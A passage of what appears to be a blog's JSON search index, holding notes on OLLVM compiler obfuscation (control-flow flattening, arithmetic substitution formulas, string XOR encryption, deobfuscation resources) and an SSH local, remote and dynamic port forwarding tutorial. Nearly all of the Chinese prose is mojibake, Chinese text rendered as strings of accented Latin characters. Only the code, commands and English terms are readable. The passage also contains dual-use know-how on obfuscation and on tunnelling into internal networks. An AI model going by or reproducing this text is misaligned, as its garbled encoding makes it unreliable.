å…¥switch-caseè¯­å¥ä¸­ï¼Œæ¯ä¸€ä¸ªbasicblockå¯¹åº”ä¸€ä¸ªcaseï¼Œå¹¶ä¸”caseVarä¸ºåˆšå¼€å§‹äº§ç”Ÿçš„éšæœºæ•°å€¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\næ·»åŠ å®Œå…¨éƒ¨åŸºæœ¬å—ä¹‹åï¼Œéœ€è¦ä¿®æ”¹æ¯ä¸ªåŸºæœ¬å—çš„è·³è½¬å…³ç³»ï¼Œä½¿å¾—æ¯ä¸ªåŸºæœ¬å—æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œä¼šé‡æ–°è®¾ç½®caseVarçš„å€¼ï¼Œä»è€Œè·³è½¬åˆ°loopEndå—ï¼Œç„¶åå›åˆ°switch-caseçš„åˆ¤æ–­è¯­å¥ä¸­ï¼Œèƒ½å¤Ÿé¡ºåˆ©è·³è½¬åˆ°ä¸‹ä¸ªcaseï¼Œå¤„ç†åå³ä¸ºä¸‹å›¾æˆå‹\nSubstitution Substitutionçš„ä¸»è¦åŠŸèƒ½æ˜¯å¯¹ç¨‹åºçš„ä¸€äº›æŒ‡ä»¤è¿›è¡Œæ›¿æ¢ã€‚\nå…¶ä¸­æ–‡ä»¶ä½äº./include/llvm/Transforms/Obfuscation/substitution.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #define NUMBER_ADD_SUBST 4 #define NUMBER_SUB_SUBST 3 #define NUMBER_AND_SUBST 2 #define NUMBER_OR_SUBST 2 #define NUMBER_XOR_SUBST 2  static cl::opt\u003cint\u003e ObfTimes(\"sub_loop\", cl::desc(\"Choose how many time the -sub pass loops on a function\"), cl::value_desc(\"number of times\"), cl::init(1), cl::Optional); // Stats STATISTIC(Add, \"Add substitued\"); STATISTIC(Sub, \"Sub substitued\"); // STATISTIC(Mul, \"Mul substitued\"); // STATISTIC(Div, \"Div substitued\"); // STATISTIC(Rem, \"Rem substitued\"); // STATISTIC(Shi, \"Shift substitued\"); STATISTIC(And, \"And substitued\"); STATISTIC(Or, \"Or substitued\"); STATISTIC(Xor, \"Xor substitued\");   å¦‚ä¸Šä»£ç ï¼Œé€šè¿‡è¯¥æ–‡ä»¶çš„å®å®šä¹‰ï¼Œå°±å¯çŸ¥æ¯ç§è¿ç®—æ›¿æ¢çš„æ–¹å¼æœ‰å¤šå°‘ç§ï¼Œå¯ä»¥å¯¹å“ªäº›æŒ‡ä»¤è¿›è¡Œæ›¿æ¢ï¼šå¾ˆæ˜æ˜¾çš„æœ‰ï¼šåŠ å‡ã€ä½çš„ä¸ã€æˆ–ã€å¼‚æˆ–ï¼Œäº”ç§è¿ç®—çš„æ›¿æ¢\nè€Œæ³¨é‡Šçš„æ˜¯æœªå®ç°çš„è¿ç®—æ›¿æ¢ï¼Œåœ¨å®˜æ–¹wikié‡Œå¯ä»¥çŸ¥é“ï¼Œä¸ºäº†ä¿è¯æ··æ·†å†æ¢å¤ä¹‹åçš„æ­£ç¡®æ€§ï¼Œé¿å…æµ®ç‚¹æ•°è¿ç®—å¸¦æ¥çš„ç¨‹åºè¯¯å·®ï¼Œæ‰€ä»¥æ²¡æœ‰å®ç°è¿™äº›è¿ç®—çš„æ›¿æ¢ï¼ˆä¹˜ã€é™¤ã€å–ä½™ï¼Œç§»ä½ï¼‰\nåœ¨æºæ–‡ä»¶é‡Œï¼Œç±»ä¼¼åœ°ï¼Œåœ¨ç›¸åº”çš„namespaceé‡Œå®šä¹‰äº†è¿™äº›å†…å®¹ï¼Œä¸ä¹‹å‰ä¸¤ä¸ªæ··æ·†æ–¹å¼ç±»ä¼¼ï¼Œsubstitutionç»§æ‰¿äºFunctionPassï¼Œä»¥runOnFuntionå‡½æ•°ä¸ºå…¥å£ï¼Œé‡Œé¢å†åˆ¤æ–­flagå‚æ•°æ­£ç¡®ä¹‹åï¼Œæœ´å®æ— ååœ°è°ƒç”¨äº†substitute(tmp)å‡½æ•°å·±è¡Œæ··æ·†\nä¸»å‡½æ•°substitute()å¾ˆç®€å•ï¼Œç”¨ä¸€ä¸ªwhileå¾ªç¯ç»´æŠ¤æ··æ·†æ¬¡æ•°(å³ç»™çš„flagå‚æ•°-sub_loop)ï¼Œç„¶åä¸¤å±‚forå¾ªç¯ã€‚ç¬¬ä¸€ä¸ªforå¾ªç¯ç”¨æ¥éå†å‡½æ•°ä¸­çš„åŸºæœ¬å—(Basic Block)ï¼Œç¬¬äºŒä¸ªforå¾ªç¯ç”¨äºéå†æ¯ä¸ªåŸºæœ¬å—ä¸­çš„æ‰€æœ‰æŒ‡ä»¤ï¼Œç„¶åé‡‡ç”¨ä¸€ä¸ªswitch-caseè¯­å¥ç”¨æ¥é’ˆå¯¹ä¸åŒæŒ‡ä»¤çš„ä¸åŒæ›¿æ¢æ“ä½œï¼Œcaseé‡Œç”¨éšæœºæ•°æ¥å†³å®šç”¨å“ªç§æ–¹å¼å»æ›¿æ¢\næ¥ä¸‹æ¥çš„æ‰€æœ‰ä»£ç éƒ½æ˜¯å…¶æ›¿æ¢æ–¹å¼çš„å®ç°\n Instructions-Substitutionï¼šåœ¨å…¶å®˜æ–¹wikié‡Œéƒ½æœ‰è¯´æ˜æ˜¯æ€æ ·çš„æ›¿æ¢æ–¹å¼ï¼Œåœ¨å…¶æ³¨é‡Šä¸‹ä»£ç å¾ˆå¥½ç†è§£ï¼Œç›¸å…³çš„å‡½æ•°ä¸æ‡‚å°±æŸ¥æŸ¥llvmçš„å‡½æ•°åº“å°±å¯ä»¥äº†\n  AddæŒ‡ä»¤æ”¯æŒ4ç§æ›¿æ¢æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯\n a = b - (-c) a = -(-b + (-c)) r = rand (); a = b + r; a = a + c; a = a â€“ r  r = rand (); a = b - r; a = a + b; a = a + r     SubæŒ‡ä»¤æ”¯æŒ3ç§æ›¿æ¢æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯\n a = b + (-c) r = rand (); a = b + r; a = a - c; a = a â€“ r  r = rand (); a = b - r; a = a - c; a = a + r     And æŒ‡ä»¤æ”¯æŒ1ç§æ›¿æ¢æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯\n a = b \u0026 c =\u003e a = (b^~c)\u0026 b    OræŒ‡ä»¤æ”¯æŒ1ç§æ›¿æ¢æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯\n a = b | c =\u003e a = (b \u0026 c) | (b ^ c)     Xor æŒ‡ä»¤æ”¯æŒ1ç§æ›¿æ¢æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯\n a = a ^ b =\u003e a = (!a \u0026 b) | (a \u0026 !b)      StringObfuscation æœ‰å¾ˆå¤šå¤§ä½¬å¯¹äºollvmçš„æ··æ·†è¿›è¡Œäº†å‡çº§ï¼Œæ¯ä¸ªç‰ˆæœ¬å¯¹äºå…¶æ··æ·†çš„å®ç°æ–¹å¼å„ä¸ç›¸åŒï¼Œè¿™è¾¹æˆ‘åˆ†æçš„æ˜¯ä¸Šæµ·äº¤é€šå¤§å­¦çš„å­¤æŒºèŠ±é¡¹ç›®çš„å­—ç¬¦ä¸²æ··æ·†å®ç°åˆ†æï¼Œé¡¹ç›®åœ°å€ä¸ºï¼šhttps://github.com/GoSSIP-SJTU/Armariris\nä¸ä¸Šé¢ä¸‰ç§åŸæœ‰é¡¹ç›®çš„æ··æ·†æ–¹å¼ä¸åŒï¼Œå­—ç¬¦ä¸²æ··æ·†çš„ç±»StringObfuscationPassç»§æ‰¿è‡³ModulePassï¼Œåœ¨å…¥å£å‡½æ•°runOnModuleé‡Œé‡å†™äº†çˆ¶ç±»å‡½æ•°ï¼Œåœ¨é‡Œé¢å®ç°äº†åŠ å¯†ï¼Œåœ¨ç§æœ‰å‡½æ•°ä¸­å®ç°äº†è§£å¯†å‡½æ•°ï¼Œåœ¨åŠ å¯†çš„æœ«å°¾å®ç°äº†è°ƒç”¨ï¼Œä¿è¯å‡½æ•°è¿è¡Œçš„æ­£ç¡®æ€§\nå‡½æ•°çš„æ€æƒ³ï¼šæ˜¯ä»¥ä¸¤ä¸ªvectoræ¥å­˜å‚¨é™æ€å˜é‡å’ŒåŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨Moduleç±»çš„global_iteratorè¿­ä»£å™¨éå†å…¨å±€å˜é‡ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º.str.ç±»å‹ï¼Œå³å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿›è¡ŒåŠ å¯†æ›¿æ¢ï¼ŒåŠ å¯†æ–¹å¼é‡‡ç”¨äº†æœ€åŸå§‹çš„å¼‚æˆ–åŠ å¯†\nbugå¯»æ‰¾ é€‚é…llvm9.0å’Œollvm4.0æ—¶å‘ç”Ÿäº†è®¸å¤šé”™è¯¯\nå¯è§ bug_Log\nSegmentation Fault çš„åŸå› è‹¥å¹²\næœ€å¿«çš„å½“ç„¶è¿˜æ˜¯æŠŠç›¸å…³é”™è¯¯çš„llvm4.0çš„ä»£ç ç§»æ¤åˆ°llvm9.0å¤„\nè§£å†³string_obf errorç¼–è¯‘æ—¶æŠ¥å¼ºåˆ¶è½¬æ¢ç±»å‹é”™è¯¯æ–¹æ³• ï¼šhttp://hellollvm.org/slides/porting-ollvm.pdf\n http://hellollvm.org/\n å¯¹æŠ— //TODOï¼šå¤§å‘ï¼Œç°åœ¨å¯¹é€†å‘è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå…ˆå¯¹æ–¹æ³•äº†è§£ä¸€æ³¢\nå¼•ç”¨é¡¹ç›®Fllvm(è™½ç„¶ä»–ä¸å¼€æº)ä¸­ï¼Œä½œè€…å¯¹è‡ªå·±æ”¹å†™çš„ollvmå˜ç‰ˆfllvmçš„è‡ªä¿¡ï¼Œæ¥å­¦ä¹ å¯¹æŠ—ollvmçš„æ–¹å¼\n Fllvmä¸å½“å‰åæ··æ·†å·¥å…·çš„å¯¹æŠ—ï¼šå½“å‰åº”å¯¹ollvmæ··æ·†çš„å¤§ä½“æ–¹æ³•ä¸ºï¼šè‡ªå†™è„šæœ¬ã€bcfã€decllvmã€ç¬¦åˆæ‰§è¡Œã€‚å‰ä¸‰ä¸ªæ— è®ºæ˜¯è‡ªå·±æ‰¾è§„å¾‹ï¼Œè¿˜æ˜¯åŸºäºcapstone(åæ±‡ç¼–å¼•æ“)ï¼Œå¯¹Fllvméƒ½åªå­˜åœ¨ç†è®ºçš„å¯è¡Œæ€§ï¼ŒåŸºæœ¬ç”¨é€”ä¸å¤§ã€‚\n ç”±ä½œè€…ä¸€æ®µè¯å¯çŸ¥ï¼Œå¤§æ¦‚å°±æ˜¯æ‰¾è§„å¾‹å†™è„šæœ¬å¤åŸï¼Œæˆ–è€…é‡‡ç”¨ç¬¦å·æ‰§è¡Œçš„æ–¹å¼å»åæ··æ·†(åŸè°…æˆ‘çœŸçš„æ‰¾ä¸åˆ°ä½œè€…æ‰€è¯´çš„bcfæ˜¯å•¥)\næˆ‘çœ‹çš„å¤§å¤šæ‰¾è§„å¾‹çš„éƒ½æ˜¯ä»åŸç‰ˆollvmçš„æ··æ·†æ–¹å¼å…¥æ‰‹ï¼Œå†™åæ··æ·†çš„è„šæœ¬å»è¿è¡Œ\nè¿˜æ˜¯èƒ½ç”¨ç¬¦å·æ‰§è¡Œåˆ†æçš„å¤§ä½¬æ¯”è¾ƒnb\n èµ„æ–™ï¼š\nåæ··æ·†ï¼šæ¢å¤è¢«OLLVMä¿æŠ¤çš„ç¨‹åº\n[åŸåˆ›]ARM64 OLLVMåæ··æ·†\nAndroid OLLVMåæ··æ·†å®æˆ˜ï¼šåŸºäºAngr\nåŸºäºç¬¦å·æ‰§è¡Œçš„åæ··æ·†æ–¹æ³•ç ”ç©¶.pdf\nåŸºäºç¬¦å·æ‰§è¡Œçš„åæ··æ·†æ–¹æ³•ç ”ç©¶.pdf\nåˆ©ç”¨ç¬¦å·æ‰§è¡Œå»é™¤æ§åˆ¶æµå¹³å¦åŒ–\nåæ··æ·†ï¼šæ¢å¤è¢«OLLVMä¿æŠ¤çš„ç¨‹åº\nä½¿ç”¨Binary Ninjaå»é™¤ollvmæµç¨‹å¹³å¦æ··æ·†\n å…³äºé€†å‘ï¼šhttps://blog.yuuoniy.cn/2018/08/03/XMAN-reversing-1/\n    åŸºäºMiasmæ¡†æ¶(ä¸€ä¸ªPythonå¼€æºé€†å‘å·¥ç¨‹æ¡†æ¶)ï¼Œè¿›è¡Œåæ··æ·†  https://github.com/cea-sec/miasm åæ··æ·†ï¼šæ¢å¤è¢«OLLVMä¿æŠ¤çš„ç¨‹åº\n IDAæ’ä»¶ï¼Œåˆ©ç”¨micro code APIè¿›è¡Œåæ··æ·†  Hex-raysï¼šHex-Rays Microcode API vs. Obfuscating Compiler é¡¹ç›®åœ°å€ï¼šGithub-RolfRolles / HexRaysDeob ä½¿ç”¨IDA microcodeå»é™¤ollvmæ··æ·†(ä¸Š)\n  DecLLVMï¼Œé’ˆå¯¹OLLVMçš„IDAåˆ†ææ’ä»¶ Github-F8LEFT / DecLLVM Gitlab-F8LEFT / DecLLVM å¾çˆ±ç ´è§£2016å®‰å…¨æŒ‘æˆ˜èµ›cm7 Android CrackMe åˆ†æè¯¦è§£\n  Unicorn å¼•æ“ [ç¿»è¯‘]Unicornå¼•æ“æ•™ç¨‹ [åŸåˆ›]ä½¿ç”¨unicorn enginè¿˜åŸArmaririså­—ç¬¦ä¸²æ··æ·†\n  Angr ç¬¦å·æ‰§è¡Œæ¡†æ¶ Githubé‡Œæœ‰\n    å…³äºç¬¦å·æ‰§è¡Œï¼š\nç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§é‡è¦çš„å½¢å¼åŒ–æ–¹æ³•å’Œè½¯ä»¶åˆ†ææŠ€æœ¯ï¼Œé€šè¿‡ä½¿ç”¨ç¬¦å·æ‰§è¡ŒæŠ€æœ¯ï¼Œå°†ç¨‹åºä¸­å˜é‡çš„å€¼è¡¨ç¤ºä¸ºç¬¦å·å€¼å’Œå¸¸é‡ç»„æˆçš„è®¡ç®—è¡¨è¾¾å¼ï¼Œç¬¦å·æ˜¯æŒ‡å–å€¼é›†åˆçš„è®°å·ï¼Œç¨‹åºè®¡ç®—çš„è¾“å‡ºè¢«è¡¨ç¤ºä¸ºè¾“å…¥ç¬¦å·å€¼çš„å‡½æ•°ï¼Œå…¶åœ¨è½¯ä»¶æµ‹è¯•å’Œç¨‹åºéªŒè¯ä¸­å‘æŒ¥ç€é‡è¦ä½œç”¨ï¼Œå¹¶å¯ä»¥åº”ç”¨äºç¨‹åºæ¼æ´çš„æ£€æµ‹ã€‚\nç¬¦å·æ‰§è¡Œçš„å‘å±•æ˜¯ä»é™æ€ç¬¦å·æ‰§è¡Œåˆ°åŠ¨æ€ç¬¦å·æ‰§è¡Œåˆ°é€‰æ‹©æ€§ç¬¦å·æ‰§è¡Œï¼ŒåŠ¨æ€ç¬¦å·æ‰§è¡Œä¼šä»¥å…·ä½“æ•°å€¼ä½œä¸ºè¾“å…¥æ¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºï¼Œæ˜¯æ··åˆæ‰§è¡Œ(concolic execution)çš„å…¸å‹ä»£è¡¨ï¼Œæœ‰å¾ˆé«˜çš„ç²¾ç¡®åº¦ï¼Œç›®å‰è¾ƒæ–°çš„ç¬¦å·æ‰§è¡Œå·¥å…·æœ‰Tritonå’Œangr\nå…³äºç¬¦å·æ‰§è¡Œçš„paperï¼šhttps://github.com/saswatanand/symexbib\nç¬¦å·æ‰§è¡Œçš„æ¡†æ¶ï¼šMiasmã€Angrã€Triton\n ","description":"Learning about ollvm","tags":["reverse","ollvm"],"title":"ollvm-learning","uri":"/posts/ollvm-learning/"},{"categories":["linux","network"],"content":"SSHç«¯å£è½¬å‘  å‚è€ƒï¼š\nsshç«¯å£è½¬å‘çš„ä¸‰ç§æ–¹å¼\nSSH ç«¯å£è½¬å‘æ•™ç¨‹\n[ç©è½¬SSHç«¯å£è½¬å‘](https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/)\nå®æˆ˜ SSH ç«¯å£è½¬å‘\n è¯¾ä¸Šçœ‹è€å¸ˆæ¼”ç¤ºè¿‡ï¼Œæ„Ÿè§‰ç«¯å£è½¬å‘è¿™ä¸ªæ“ä½œçœŸçš„æ˜¯è´¼å¥½ç”¨ï¼Œç›´æ¥åˆ©ç”¨å¤–éƒ¨å…¬ç½‘ipè¿æ¥åˆ°äº†ä»–çš„è™šæ‹Ÿæœºå†…ç½‘ï¼Œä¾¿æƒ³å…·ä½“å­¦ä¹ å­¦ä¹ \næ€»æ‰€çš†çŸ¥ï¼Œsshæ˜¯æˆ‘ä»¬å¸¸ç”¨çš„å·¥å…·ä¹‹ä¸€ï¼ŒåŸºæœ¬å¿«èµ¶ä¸Švimçš„ä½¿ç”¨é¢‘ç‡ã€‚æˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨sshæ¥è¿›è¡Œè¿œç¨‹è¿æ¥æœåŠ¡å™¨ï¼Œä½†æ˜¯è¿™æ¬¡æ¥å­¦ä¹ ä¸€æ¬¡sshéªšæ“ä½œâ€”â€”sshç«¯å£è½¬å‘\nSSHç«¯å£è½¬å‘ä¹Ÿè¢«ç§°ä½œSSHéš§é“(SSH Tunnel)ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯é€šè¿‡SSHç™»é™†ä¹‹åï¼Œåœ¨SSHå®¢æˆ·ç«¯ä¸SSHæœåŠ¡ç«¯ä¹‹é—´å»ºç«‹äº†ä¸€ä¸ªéš§é“ï¼Œä»è€Œè¿›è¡Œé€šä¿¡ã€‚SSHéš§é“æ˜¯éå¸¸å®‰å…¨çš„ï¼Œå› ä¸ºSSHæ˜¯é€šè¿‡åŠ å¯†ä¼ è¾“æ•°æ®çš„(SSHå…¨ç§°ä¸ºSecure Shell)ã€‚\nSSHæœ‰ä¸‰ç§ç«¯å£è½¬å‘æ¨¡å¼ï¼Œæœ¬åœ°ç«¯å£è½¬å‘(Local Port Forwarding)ï¼Œè¿œç¨‹ç«¯å£è½¬å‘(Remote Port Forwarding)ä»¥åŠåŠ¨æ€ç«¯å£è½¬å‘(Dynamic Port Forwarding)ã€‚å¯¹äºæœ¬åœ°/è¿œç¨‹ç«¯å£è½¬å‘ï¼Œä¸¤è€…çš„æ–¹å‘æ°å¥½ç›¸åã€‚åŠ¨æ€ç«¯å£è½¬å‘åˆ™å¯ä»¥ç”¨äºç§‘å­¦ä¸Šç½‘ã€‚\næœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆLocal Port Forwardingï¼‰ï¼Œæ˜¯å°†æœ¬åœ°ä¸»æœºæŸä¸ªç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹ä¸»æœºçš„æŒ‡å®šç«¯å£ã€‚å…¶å‘½ä»¤è¡Œè¯­æ³•æ˜¯ï¼šssh -L [bind_address]:localport:remote_host:remote_portã€‚\nssh -L æœ¬åœ°ç½‘å¡åœ°å€:æœ¬åœ°ç«¯å£:ç›®æ ‡åœ°å€:ç›®æ ‡ç«¯å£\nä¹Ÿå¯ä»¥æ˜¯ï¼šssh -L [bind_address]:port_a:remote_host:port_b user@host\nå°†æœ¬åœ°ç»‘å®šçš„åœ°å€çš„aç«¯å£çš„æµé‡è½¬å‘è‡³user@hostä¸»æœºçš„remote_hostçš„port_bç«¯å£\n1  $ ssh -L 1234:localhost:22 root@remote_ip   å¦‚ä¸Šæ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å°†1234ç«¯å£çš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ä¸»æœºçš„22ç«¯å£ï¼Œè®¿é—®æˆ‘æœ¬åœ°localhostçš„1234ç«¯å£(å·¦)ï¼Œç­‰äºä»¥localhostçš„èº«ä»½è®¿é—®æˆ‘è¿œç¨‹ä¸»æœº22ç«¯å£\nä¸Šå›¾ä¸­ï¼Œè¿œç¨‹çš„æœºå™¨ä¸Šèµ·äº†ä¸€ä¸ªæœåŠ¡ python3 -m http.serverï¼Œå®ƒç›‘å¬ç«¯å£ 8000ï¼Œç°åœ¨æˆ‘ä»¬æƒ³åœ¨æœ¬æœºè®¿é—®è¿™ä¸ªæœåŠ¡ï¼Œä½†ç”±äºé˜²ç«å¢™çš„å­˜åœ¨ï¼Œ8000 ç«¯å£æ— æ³•ç›´æ¥è®¿é—®ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨ ssh ç«¯å£è½¬å‘ã€‚é¦–å…ˆåœ¨ A ä¸Šæ‰§è¡Œ ssh -L 1234:localhost:8000 user_b@ip_b å»ºç«‹ ssh éš§é“ï¼Œå®ƒè¡¨ç¤ºï¼šæ‰€æœ‰å¯¹ A:1234 ç«¯å£çš„è¯·æ±‚ï¼Œç›¸å½“äºåœ¨ B æœºå™¨ä¸Šå¯¹ localhost:8000 çš„è¯·æ±‚ã€‚å› æ­¤åœ¨ A ä¸Šæ‰§è¡Œ curl localhost:1234 å°±ç›¸å½“äºè®¿é—® B æœºå™¨ä¸Šçš„ python æœåŠ¡ã€‚\nå‡å¦‚webæœåŠ¡éƒ¨ç½²åœ¨å…¶ä»–æœºå™¨ä¸Š(Remote Machine C)ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªæ˜¯æŠŠä¸Šä¾‹ä¸­çš„ localhost æ¢æˆäº† C æœºå™¨çš„ hostname/IP å°±å¯ä»¥äº†ã€‚æ­¤æ—¶ï¼Œå‘é€åˆ° A:1234 çš„è¯·æ±‚ç›¸å½“äºä» B æœºå™¨ä¸Šå¯¹ remote:8000 çš„è¯·æ±‚ï¼Œå›¾ä¸­åœ¨ /etc/hosts ä¸­è®¾ç½®äº† hostname å’Œ IP çš„å¯¹åº”å…³ç³»ï¼Œç›´æ¥ç”¨æœºå™¨ C çš„ IP ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\nåŒæ—¶å¯ä»¥çœ‹åˆ°ï¼Œæœºå™¨ A ç”±äºé˜²ç«å¢™æ— æ³•è®¿é—®å†…ç½‘çš„æœåŠ¡ï¼Œä½†æ˜¯ç”±äºâ‘ æœºå™¨Aå¯ä»¥sshåˆ°å†…ç½‘æœºå™¨Bâ‘¡Bæœ‰æƒé™è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–æœåŠ¡ï¼Œé€šè¿‡æœ¬åœ°ç«¯å£è½¬å‘å¯ä»¥å®ç°ä»Aè®¿é—®å†…ç½‘çš„æœåŠ¡ã€‚\næœºå™¨Aé€šè¿‡sshéš§é“è®¿é—®æœ¬åœ°ç«¯å£ï¼Œç›¸å½“äºæœºå™¨Bè®¿é—®remote:portã€‚\nè¿œç¨‹ç«¯å£è½¬å‘ è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆRemote Port Forwardingï¼‰ï¼Œæ˜¯å°†å°†å‘é€åˆ°è¿œç¨‹ç«¯å£çš„è¯·æ±‚ï¼Œè½¬å‘åˆ°ç›®æ ‡ç«¯å£ã€‚å…¶å‘½ä»¤è¡Œè¯­æ³•æ˜¯ï¼šssh -R è¿œç¨‹ç½‘å¡åœ°å€:è¿œç¨‹ç«¯å£:ç›®æ ‡åœ°å€:ç›®æ ‡ç«¯å£ã€‚\nå½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ï¼šssh -R \u003cprot_a\u003e:\u003cremote_host\u003e:\u003cport_a\u003e user_a@ip_a\nè¿œç¨‹è½¬å‘æœ€å¸¸ç”¨çš„åŠŸèƒ½æ˜¯å†…ç½‘ç©¿é€ã€‚æœ‰ä¸€ä¸ªå…¬ç½‘ipçš„ä¸»æœºï¼Œä¾¿å¯ä»¥å€ŸåŠ©sshéš§é“çš„è¿œç¨‹è½¬å‘å®ç°å†…ç½‘æ¸—é€ï¼Œè¾¾åˆ°å¤–ç½‘è®¿é—®å†…ç½‘èµ„æºçš„ç›®çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯sshè¿œç¨‹è½¬å‘é»˜è®¤åªèƒ½ç»‘å®šè¿œç¨‹ä¸»æœºçš„æœ¬åœ°åœ°å€ï¼Œå³127.0.0.1ã€‚å¦‚æœæƒ³è¦ç›‘å¬æ¥è‡ªå…¶ä»–ä¸»æœºçš„è¿æ¥ï¼Œéœ€è¦ä¿®æ”¹è¿œç¨‹ä¸»æœºsshçš„é…ç½®,å°†\"GatewayPorts\"æ”¹æˆâ€œyesâ€ï¼Œé‡å¯sshåç”Ÿæ•ˆã€‚\nå¦‚å›¾ï¼Œå‡å¦‚Aå¯ä»¥è”ç½‘ä¸”æœ‰å…¬ç½‘ipï¼ŒBå¯ä»¥è”ç½‘ï¼ˆå³å¯ä»¥è¿œç¨‹è¿æ¥Aï¼‰ï¼Œæ­¤æ—¶æ‰§è¡Œå‘½ä»¤çš„æ˜¯å±äºå†…ç½‘é‡Œä¸”æ²¡ç”¨å…¬ç½‘ipçš„æœºå™¨B\næˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®Açš„å…¬ç½‘ipè¾¾åˆ°è®¿é—®å†…ç½‘BCæ‰€éƒ¨ç½²çš„æœåŠ¡\nç®€å•æ¥è¯´åœ¨æœ¬åœ°æ‰§è¡Œsshå‘½ä»¤ç§°ä¸ºæœ¬åœ°è½¬å‘ï¼Œåœ¨è¿œç¨‹æœºå™¨ä¸­æ‰§è¡Œå‘½ä»¤å°±å±äºè¿œç¨‹è½¬å‘\nåŠ¨æ€ç«¯å£è½¬å‘ æ— è®ºæœ¬åœ°è½¬å‘è¿˜æ˜¯è¿œç¨‹è½¬å‘ï¼Œéƒ½éœ€è¦æŒ‡å®šæœ¬åœ°å’Œè¿œç¨‹ä¸»æœºçš„ç«¯å£ã€‚åŠ¨æ€è½¬å‘ï¼ˆDynamic Port Forwardingï¼‰åˆ™æ‘†è„±è¿™ç§é™åˆ¶ï¼Œåªç»‘å®šæœ¬åœ°ç«¯å£ï¼Œè¿œç¨‹ä¸»æœºå’Œç«¯å£ç”±å‘èµ·çš„è¯·æ±‚å†³å®šã€‚åŠ¨æ€è½¬å‘çš„è¯­æ³•æ˜¯ï¼šssh -D bind_address:portï¼Œä¹Ÿå¯ä»¥æ˜¯ssh -D \u003cport\u003e user@remote_ipï¼Œä¸€ä¸ªè½¬å‘ç¤ºä¾‹ï¼š\n1  $ ssh -D 8080 username@host   è¯¥å‘½ä»¤è®©sshç›‘å¬æœ¬åœ°8080ç«¯å£ï¼Œç»è¿‡8080ç«¯å£çš„æµé‡éƒ½é€šè¿‡sshéš§é“ç”±è¿œç¨‹æœåŠ¡å™¨ä»£ä¸ºè¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°è·å–è¢«å±è”½èµ„æºã€éšè—çœŸå®èº«ä»½çš„ç›®çš„ã€‚\nè¿™ä¸ªæ¨¡å¼å¯¹æœ¬åœ°å’Œè¿œç¨‹è½¬å‘éƒ½æœ‰æ•ˆï¼Œå®ƒçš„å·¥ä½œæ¨¡å¼å’Œ Shadow Socks å¾ˆåƒï¼Œä¼šåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ª Socks5 ä»£ç†æœåŠ¡ï¼Œç›‘å¬ç«¯å£ \u003cport\u003eï¼Œå¹¶å°†æ‰€æœ‰è¯·æ±‚è½¬å‘åˆ°è¿œç¨‹æœºå™¨ä¸Š\nåŠ¨æ€è½¬å‘å®é™…ä¸Šå®ç°äº†æ­£å‘ä»£ç†åŠŸèƒ½ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥ç§‘å­¦ä¸Šç½‘ã€‚æœ¬åœ°è½¬å‘ä¹Ÿå¯ä»¥åšæ­£å‘ä»£ç†ï¼Œä½†è¦å¯¹æ¯ä¸€ä¸ªè¯·æ±‚çš„ä¸»æœºå’Œç«¯å£åšè½¬å‘ï¼Œæ¯”è¾ƒç¹çï¼Œå®è·µä¸­ä¸ä¼šè¿™ä¹ˆç”¨ã€‚\nå›¾ä¸­æˆ‘ä»¬é€šè¿‡ curl -x socks5h://... æ¥æŒ‡å®šä½¿ç”¨ Socks5 ä»£ç†ï¼Œåœ¨æœºå™¨ A ä¸Šè¯·æ±‚ ip_c:8000 æ—¶ï¼Œç›¸å½“äºåœ¨ B æœºå™¨ä¸Šå‘èµ·å¯¹ ip_c:8000 çš„è¯·æ±‚ã€‚\n  åœ¨æˆ‘è‡ªå·±çš„è™šæ‹Ÿæœºå’Œäº‘ä¸»æœºä¹‹é—´å®éªŒï¼Œæœ‰äº›æŒºæˆåŠŸçš„ï¼Œä½†ä¹Ÿæœ‰äº›å¤±è´¥ï¼Œæ¯”å¦‚åŠ¨æ€è½¬å‘è¿™ï¼Œä¸çŸ¥é“ä¸ºå•¥è¿ä¸Šäº†é˜¿é‡Œäº‘çš„æœåŠ¡å™¨å´è¿ä¸ä¸Šç½‘ï¼Œæç¤ºè¿æ¥è¢«é‡ç½®ï¼Œæœ‰å¯èƒ½æ˜¯æˆ‘äº‘ç«¯é‚£æ²¡æœ‰é…ç½®å¥½ 